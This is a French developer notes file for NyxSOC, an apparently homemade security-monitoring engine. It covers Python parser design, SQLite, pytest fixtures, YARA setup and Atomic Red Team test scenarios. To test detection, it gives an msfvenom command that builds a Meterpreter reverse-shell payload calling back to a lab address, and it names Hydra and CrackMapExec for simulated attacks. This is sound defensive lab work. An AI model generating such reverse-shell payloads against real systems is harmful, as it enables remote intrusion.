# IMPLEMENTATION_NOTES.md

## Carnet de bord technique — NyxSOC Engine

## Ce fichier est une référence rapide pendant le développement

## Il concentre les points techniques précis, les pièges connus

## et les ressources utiles par module

---

## 0. Avant de commencer — checklist

- [ ] Python 3.12 sur le SOC (`python3 --version`)
- [ ] Venv activé (`python3 -m venv .venv && source .venv/bin/activate`)
- [ ] Dépendances installées (`pip install -r requirements.txt`)
- [ ] `/var/log/remote/` accessible en lecture (groupe `adm`)
- [ ] `/var/log/nyxsoc/` créé et accessible en écriture
- [ ] `engine.db` absent au démarrage — il sera créé par StateManager
- [ ] Règles YAML écrites dans `rules/` avant de toucher au RuleEngine
- [ ] Fixtures synthétiques dans `tests/fixtures/` avant d'écrire les tests

---

## 1. Concepts de programmation — rappels rapides

### ABC — Classes abstraites (base_parser.py)

```python
from abc import ABC, abstractmethod

class BaseParser(ABC):
    @abstractmethod
    def parse(self, line: str) -> dict | None:
        ...
```

- `ABC` = Abstract Base Class. Une classe qui hérite de `ABC` ne peut pas
  être instanciée directement si elle a des méthodes `@abstractmethod`.
- Si `SyslogParser(BaseParser)` n'implémente pas `parse()` → `TypeError`
  à l'instanciation, pas à l'appel. Erreur explicite et précoce.
- Le Dispatcher reçoit un `BaseParser` → il peut recevoir n'importe quel
  parser concret sans modification (Liskov Substitution Principle).

**Ressource** : https://docs.python.org/3/library/abc.html 

---

### SRP — Responsabilité unique

Chaque classe fait **une chose**. Si tu décris le rôle d'une classe avec
"et", c'est un signal que tu dois la diviser.

| Classe | Une chose |
|---|---|
| `SyslogParser` | Parser des logs syslog RFC 5424 |
| `EventValidator` | Valider le schéma d'un événement normalisé |
| `StateManager` | Lire et écrire dans SQLite |
| `RuleEngine` | Évaluer des règles YAML contre des événements |
| `Alerter` | Publier des alertes |

**Ressource** : https://en.wikipedia.org/wiki/Single-responsibility_principle

---

### Injection de dépendance

Ne jamais instancier `StateManager` à l'intérieur de `RuleEngine` ou
`Dispatcher`. L'instancier dans `main.py` et le passer en paramètre.

```python
# FAUX — couplage fort, impossible à tester
class RuleEngine:
    def __init__(self):
        self.state = StateManager("engine.db")  # hardcodé

# CORRECT — injection, testable avec :memory:
class RuleEngine:
    def __init__(self, state_manager: StateManager):
        self.state = state_manager

# Dans main.py
sm = StateManager(config["db_path"])
re = RuleEngine(sm)

# Dans les tests
sm_test = StateManager(":memory:")
re_test = RuleEngine(sm_test)
```

---

### Compilation des regex

```python
import re

# FAUX — recompile à chaque appel de parse()
def parse(self, line):
    m = re.match(r'Failed password for (\S+)', line)

# CORRECT — compile une fois dans __init__()
class SyslogParser(BaseParser):
    def __init__(self):
        self.RE_SSH_FAIL = re.compile(
            r'Failed password for (\S+) from ([\d.]+) port (\d+)'
        )
    def parse(self, line):
        m = self.RE_SSH_FAIL.search(line)
```

**Pourquoi** : `re.compile()` transforme le pattern en bytecode. Sur 10 000
lignes/min, la différence est mesurable. La stdlib Python met en cache les
20 dernières regex compilées implicitement, mais c'est une dépendance
fragile — compile explicitement.

**Ressource** : https://docs.python.org/3/library/re.html#re.compile

---

### Thread safety SQLite

```python
import sqlite3, threading

class StateManager:
    def __init__(self, db_path: str):
        # check_same_thread=False : autorise l'accès depuis plusieurs threads
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self._lock = threading.Lock()

    def store_event(self, event: dict) -> int:
        with self._lock:  # lock uniquement sur les écritures
            cursor = self.conn.execute("INSERT INTO events ...", (...))
            self.conn.commit()
            return cursor.lastrowid

    def count_events(self, ...) -> int:
        # Pas de lock — WAL permet les lectures concurrentes
        cursor = self.conn.execute("SELECT COUNT(*) FROM events WHERE ...")
        return cursor.fetchone()[0]
```

**Pourquoi WAL** : sans WAL, SQLite pose un verrou exclusif sur toute
écriture, bloquant toutes les lectures simultanées. WAL permet des lectures
concurrentes pendant une écriture active.

**Ressource** : https://www.sqlite.org/wal.html

---

### Écriture atomique (alerter.py)

```python
import tempfile, os, json, pathlib

def write_alert(alert: dict, alerts_dir: pathlib.Path) -> None:
    target = alerts_dir / f"alert_{alert['alert_id']}.json"
    with tempfile.NamedTemporaryFile(
        mode='w', dir=alerts_dir,
        delete=False, suffix='.tmp'
    ) as f:
        json.dump(alert, f, indent=2, ensure_ascii=False)
        tmp_path = f.name
    os.rename(tmp_path, target)  # atomique sur Linux (même filesystem)
```

**Pourquoi** : `os.rename()` est une opération atomique au niveau du noyau
Linux. Le watcher SOAR ne peut pas voir un fichier partiellement écrit —
il voit soit le fichier complet (après rename), soit rien. Si on écrivait
directement dans le fichier cible, le watcher pourrait lire un JSON
incomplet pendant l'écriture.

**Ressource** : https://man7.org/linux/man-pages/man2/rename.2.html

---

## 2. Pièges connus par module

### reader.py — pointeur de fichier

watchdog déclenche `on_modified` à chaque écriture dans le fichier.
Si tu lis tout le fichier à chaque événement, tu retraites toutes les
anciennes lignes à chaque nouvelle entrée.

```python
class LogHandler(FileSystemEventHandler):
    def __init__(self):
        self._positions = {}  # {chemin: position}

    def on_modified(self, event):
        path = event.src_path
        pos = self._positions.get(path, 0)
        with open(path, 'r') as f:
            f.seek(pos)
            new_lines = f.readlines()
            self._positions[path] = f.tell()  # sauvegarder la nouvelle position
        for line in new_lines:
            self.queue.put_nowait((line.strip(), os.path.basename(path)))
```

---

### syslog_parser.py — formats de timestamp

Deux formats coexistent dans les logs Debian selon la version de rsyslog :

```
# Format RFC 3164 (ancien rsyslog)
Jun 19 10:23:41 debian sshd[1234]: ...

# Format RFC 5424 (rsyslog moderne avec $ActionFileDefaultTemplate)
2026-06-19T10:23:41+00:00 debian sshd[1234]: ...
```

Ton parser doit gérer les deux. La fonction `parse_timestamp()` dans
`base_parser.py` doit tenter les deux formats avec `datetime.strptime()`.

```python
from datetime import datetime, timezone

def parse_timestamp(ts_str: str) -> int:
    """Convertit un timestamp string en Unix millisecondes."""
    formats = [
        "%Y-%m-%dT%H:%M:%S%z",          # ISO 8601 avec timezone
        "%Y-%m-%dT%H:%M:%S.%f%z",       # ISO 8601 avec microsecondes
        "%b %d %H:%M:%S",               # BSD syslog (sans année)
    ]
    for fmt in formats:
        try:
            dt = datetime.strptime(ts_str.strip(), fmt)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return int(dt.timestamp() * 1000)
        except ValueError:
            continue
    raise ValueError(f"Format timestamp non reconnu : {ts_str}")
```

---

### filterlog_parser.py — positions des champs variables

Le format filterlog BSD n'est pas un CSV standard. Le nombre de champs
et leurs positions varient selon :
- IPv4 vs IPv6 (champ `length` vs `class`)
- TCP vs UDP vs ICMP (ports présents ou non)

Exemple IPv4 TCP (22 champs) :
```
76,,,uuid,vtnet1,match,block,in,4,0x0,,64,0,0,none,6,tcp,60,
10.0.1.50,10.0.1.20,54321,22,0
```

Valide toujours le nombre de champs avant d'accéder par index.
La documentation OPNsense liste les positions :
https://docs.opnsense.org/manual/logging_reporting.html

---

### windows_parser.py — namespace XML

NXLog envoie les événements Windows en XML. Le XML contient des namespaces
qui compliquent le parsing avec `ElementTree` :

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4625</EventID>
  </System>
  <EventData>
    <Data Name="TargetUserName">employe</Data>
  </EventData>
</Event>
```

Avec namespace dans ElementTree :
```python
ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
root = ET.fromstring(xml_str)
event_id = root.find("e:System/e:EventID", ns).text
```

---

### state_manager.py — sérialisation du champ extra

Le champ `extra` de la table `events` est un dict Python stocké comme
string JSON dans SQLite. Ne pas oublier de sérialiser/désérialiser :

```python
# Écriture
json.dumps(event.get("extra"))   # dict → str

# Lecture
json.loads(row["extra"]) if row["extra"] else None  # str → dict
```

---

### rule_engine.py — règles non chargées

Si une règle YAML a une erreur de syntaxe, `pyyaml` lève `yaml.YAMLError`.
Le RuleEngine doit attraper cette erreur par fichier et logguer sans crasher :

```python
for yaml_file in rules_dir.glob("*.yaml"):
    try:
        with open(yaml_file) as f:
            rule = yaml.safe_load(f)
        self.rules.append(rule)
    except yaml.YAMLError as e:
        logging.error(f"Règle invalide {yaml_file}: {e}")
        # Continue — ne pas crasher sur une règle malformée
```

---

## 3. Tests — outils et patterns

### pytest — rappels essentiels

```bash
pytest tests/unit/ -v              # verbose, un test par ligne
pytest tests/unit/ -k "syslog"    # filtre par nom
pytest tests/unit/ -x             # arrêt au premier échec
pytest --cov=engine --cov-report=term-missing tests/  # couverture
```

**Ressource** : https://docs.pytest.org/en/stable/

---

### Fixtures pytest

```python
# tests/conftest.py — partagé entre tous les tests
import pytest
from engine.state_manager import StateManager

@pytest.fixture
def db():
    """StateManager en mémoire — isolé, pas de fichier disque."""
    sm = StateManager(":memory:")
    yield sm
    sm.conn.close()

# Utilisation dans un test
def test_store_and_count(db):
    event = {
        "timestamp": 1750000000000,
        "source_host": "debian",
        "event_type": "ssh_failure",
        "actor_ip": "10.0.1.50",
        "actor_user": "root",
        "target_host": None,
        "target_port": 22,
        "extra": None,
        "raw_log": "Failed password..."
    }
    db.store_event(event)
    count = db.count_events("ssh_failure", "10.0.1.50", 60)
    assert count == 1
```

---

### Tester les parsers — pattern standard

```python
# tests/unit/test_syslog_parser.py
import pytest
from engine.parsers.syslog_parser import SyslogParser

@pytest.fixture
def parser():
    return SyslogParser(debug=True)

class TestSSHFailure:
    def test_extracts_actor_ip(self, parser):
        line = ("2026-06-19T10:23:41+00:00 debian sshd[1234]: "
                "Failed password for root from 10.0.1.50 port 52341 ssh2")
        event = parser.parse(line)
        assert event["actor_ip"] == "10.0.1.50"

    def test_extracts_event_type(self, parser):
        line = ("2026-06-19T10:23:41+00:00 debian sshd[1234]: "
                "Failed password for root from 10.0.1.50 port 52341 ssh2")
        event = parser.parse(line)
        assert event["event_type"] == "ssh_failure"

    def test_unknown_line_returns_none(self, parser):
        assert parser.parse("Jun 19 10:23:41 debian cron[1]: job") is None

    def test_missing_user_is_none_not_empty(self, parser):
        line = ("2026-06-19T10:23:41+00:00 debian sshd[1234]: "
                "Invalid user  from 10.0.1.50 port 52341")
        event = parser.parse(line)
        assert event["actor_user"] is None
```

---

### jsonschema — valider le schéma de sortie des parsers

```python
import jsonschema

NORMALIZED_EVENT_SCHEMA = {
    "type": "object",
    "required": ["timestamp", "source_host", "event_type", "raw_log"],
    "properties": {
        "timestamp":   {"type": "integer"},
        "source_host": {"type": "string"},
        "event_type":  {"type": "string"},
        "actor_ip":    {"type": ["string", "null"]},
        "actor_user":  {"type": ["string", "null"]},
        "target_host": {"type": ["string", "null"]},
        "target_port": {"type": ["integer", "null"]},
        "extra":       {"type": ["object", "null"]},
        "raw_log":     {"type": "string"},
    }
}

def test_parser_output_schema_valid(parser):
    line = ("2026-06-19T10:23:41+00:00 debian sshd[1234]: "
            "Failed password for root from 10.0.1.50 port 52341 ssh2")
    event = parser.parse(line)
    # Ne lève pas d'exception si le schéma est valide
    jsonschema.validate(event, NORMALIZED_EVENT_SCHEMA)
```

**Ressource** : https://python-jsonschema.readthedocs.io/

---

## 4. YARA — setup et règles

### Installation sur le SOC

```bash
sudo apt install -y libssl-dev libmagic-dev build-essential
pip install yara-python
```

### Source des règles communautaires

```bash
git clone https://github.com/Neo23x0/signature-base.git rules/yara/signature-base/
```

Pour le projet, filtrer uniquement les règles pertinentes pour les
fichiers Windows exécutables :

```bash
# Garder uniquement les règles qui matchent des exécutables Windows malveillants
# Exclure les règles réseau, mémoire, documents qui ne s'appliquent pas
ls rules/yara/signature-base/yara/ | grep -i "meterpreter\|rat\|trojan\|malware"
```

### Générer un payload de test avec msfvenom (depuis Kali)

```bash
# Payload Meterpreter Windows — pour tester YARA
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.1.50 LPORT=4444 \
  -f exe -o payload_test.exe
```

Déposer `payload_test.exe` sur le partage Samba et vérifier que YARA
le détecte avec `yara rules/yara/malware_generic.yar payload_test.exe`.

### Test YARA minimal

```python
import yara

rules = yara.compile("rules/yara/malware_generic.yar")
matches = rules.match("payload_test.exe")
print(matches)  # [meterpreter_reverse_shell] si détecté
```

**Ressource** : https://yara.readthedocs.io/en/stable/

---

## 5. Atomic Red Team — scénarios de test

Atomic Red Team fournit des tests ATT&CK atomiques exécutables pour
valider que le moteur détecte bien les techniques simulées.

**Ressource principale** : https://github.com/redcanaryco/atomic-red-team

Techniques pertinentes pour tes scénarios :

| Scénario | Technique MITRE | Test Atomic Red Team |
|---|---|---|
| S1 — SSH brute-force | T1110 — Brute Force | T1110.001 — Password Guessing |
| S2 — SMB exfiltration | T1021.002 — SMB/Windows Admin Shares | T1021.002 |
| S3 — BEC fichier malveillant | T1204.002 — Malicious File | T1204.002 |

Pour S1 et S2, Hydra et CrackMapExec depuis Kali suffisent sans Atomic
Red Team. Pour S3, un payload Meterpreter + dépôt sur Samba est plus
rapide et contrôlé.

---

## 6. Logs synthétiques pour les fixtures

Si le lab n'est pas encore opérationnel quand tu commences à coder les
parsers, utilise ces exemples synthétiques dans `tests/fixtures/`.

### sample_syslog.log

```
2026-06-19T10:23:41+00:00 debian sshd[1234]: Failed password for root from 10.0.1.50 port 52341 ssh2
2026-06-19T10:23:42+00:00 debian sshd[1235]: Failed password for admin from 10.0.1.50 port 52350 ssh2
2026-06-19T10:23:43+00:00 debian sshd[1236]: Failed password for root from 10.0.1.50 port 52361 ssh2
2026-06-19T10:24:01+00:00 debian sshd[1250]: Accepted password for dir1 from 10.0.1.50 port 52400 ssh2
2026-06-19T10:24:05+00:00 debian smbd[1327]: NT_STATUS_WRONG_PASSWORD for dir2 from 10.0.1.50
2026-06-19T10:24:10+00:00 debian smbd[1328]: dir1 connected to share //debian/direction from 10.0.1.50
2026-06-19T10:24:15+00:00 debian apache2[1400]: 10.0.1.50 - - [19/Jun/2026:10:24:15 +0000] "GET /index.php HTTP/1.1" 200 4523
```

### sample_filterlog.log

```
2026-06-19T10:23:38+00:00 OPNsense.internal filterlog[56373]: 76,,,uuid,vtnet1,match,block,in,4,0x0,,64,0,0,none,6,tcp,60,10.0.1.50,10.0.1.20,54321,22,0
2026-06-19T10:23:39+00:00 OPNsense.internal filterlog[56374]: 76,,,uuid,vtnet1,match,pass,in,4,0x0,,64,0,0,none,17,udp,40,10.0.1.50,10.0.1.20,1234,445,0
```

### sample_windows.log (format NXLog → syslog)

```
2026-06-19T10:24:20+00:00 DESKTOP-PME NXLog[999]: <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>4625</EventID><TimeCreated SystemTime='2026-06-19T10:24:20'/><Computer>DESKTOP-PME</Computer></System><EventData><Data Name='TargetUserName'>employe</Data><Data Name='IpAddress'>10.0.1.50</Data></EventData></Event>
2026-06-19T10:25:00+00:00 DESKTOP-PME NXLog[999]: <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>11</EventID><TimeCreated SystemTime='2026-06-19T10:25:00'/><Computer>DESKTOP-PME</Computer></System><EventData><Data Name='Image'>C:\Users\employe\Downloads\payload.exe</Data><Data Name='TargetFilename'>C:\Users\employe\Downloads\payload.exe</Data><Data Name='User'>PME\employe</Data></EventData></Event>
```

---

## 7. Permissions — commandes exactes

```bash
# Créer l'utilisateur qui fait tourner le moteur
sudo useradd -r -s /bin/false nyxsoc

# Accès lecture sur /var/log/remote/
sudo usermod -aG adm nyxsoc
sudo chmod 750 /var/log/remote/
sudo chown syslog:adm /var/log/remote/

# Accès écriture sur /var/log/nyxsoc/
sudo mkdir -p /var/log/nyxsoc/alerts/
sudo chown -R nyxsoc:nyxsoc /var/log/nyxsoc/
sudo chmod 750 /var/log/nyxsoc/

# Vérification
sudo -u nyxsoc ls /var/log/remote/
sudo -u nyxsoc touch /var/log/nyxsoc/test && rm /var/log/nyxsoc/test
```

---

## 8. .gitignore — entrées minimales pour ce projet

```gitignore
# Runtime
engine/engine.db
engine/engine.db-wal
engine/engine.db-shm
/var/log/nyxsoc/

# Notes personnelles non committées
IMPLEMENTATION_NOTES.md

# Python
__pycache__/
*.py[cod]
.venv/
*.egg-info/

# Tests
.pytest_cache/
.coverage
htmlcov/

# OS
.DS_Store
```

---

## 9. Ressources par module

| Module | Ressource principale |
|---|---|
| `abc.ABC` | https://docs.python.org/3/library/abc.html |
| `watchdog` | https://python-watchdog.readthedocs.io/ |
| `queue.Queue` | https://docs.python.org/3/library/queue.html |
| `sqlite3` | https://docs.python.org/3/library/sqlite3.html |
| SQLite WAL | https://www.sqlite.org/wal.html |
| `pyyaml` | https://pyyaml.org/wiki/PyYAMLDocumentation |
| `jsonschema` | https://python-jsonschema.readthedocs.io/ |
| `yara-python` | https://yara.readthedocs.io/en/stable/ |
| `pytest` | https://docs.pytest.org/en/stable/ |
| `pytest-cov` | https://pytest-cov.readthedocs.io/ |
| `re` (regex) | https://docs.python.org/3/library/re.html |
| `fnmatch` | https://docs.python.org/3/library/fnmatch.html |
| `threading` | https://docs.python.org/3/library/threading.html |
| filterlog OPNsense | https://docs.opnsense.org/manual/logging_reporting.html |
| Sysmon EventIDs | https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon |
| NXLog CE | https://docs.nxlog.co/ce/current/ |
| MITRE ATT&CK | https://attack.mitre.org/ |
| Atomic Red Team | https://github.com/redcanaryco/atomic-red-team |
| neo23x0/signature-base | https://github.com/Neo23x0/signature-base |
| SwiftOnSecurity Sysmon config | https://github.com/SwiftOnSecurity/sysmon-config |
